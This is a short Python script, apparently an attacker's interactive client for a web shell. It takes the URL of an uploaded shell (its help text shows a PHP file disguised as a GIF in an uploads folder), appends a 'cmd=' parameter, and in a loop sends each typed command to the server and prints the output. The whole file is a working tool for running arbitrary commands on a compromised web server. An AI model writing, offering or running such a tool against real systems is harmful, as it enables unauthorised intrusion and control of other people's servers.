#!/usr/bin/env python3
#Import modules
from urllib3 import PoolManager
from argparse import ArgumentParser
from re import sub

def installer(program):
  try:
    from pip import main as pipmain
  except:
    print("[*]Pip not installed")
    exit()
  pipmain(['install', program])
  exit()

try:
  from termcolor import colored as color
except:
  installer("termcolor")

#Constants---------------------------------------------------------
http = PoolManager()
parser = ArgumentParser(description="A simple shell interactive program.")
parser.add_argument('-u', '--url', type=str, required=False, help="full url IE: http://domain/uploads/shell.gif.php")
args = parser.parse_args()
if not args.url:
  url = input("Input URL: ")
else:
  url = args.url
if not url:
  exit()
#Try file
try:
  r = http.request("GET", url)
  if not (r.status == 200 or r.status == 302):
    print("[*] Possible connection issue?")
  if not url.endswith("?"):
    url = url + "?"
  if not url.endswith("cmd="):
    url = url + "cmd="
except:
  print("Unable to contact specified url")
  exit()
while True:
  cmd = input(color(" $ ","blue"))
  if cmd == "exit":
    exit()
  uri=url+cmd
  if cmd:
    r = http.request("GET", uri)
    l = r.data.decode().splitlines()[-1] + "\n"
    txt = l + '\n'.join(str(v) for v in r.data.decode().splitlines()[1:])
    print(color(txt, "green"))
  else:
    pass
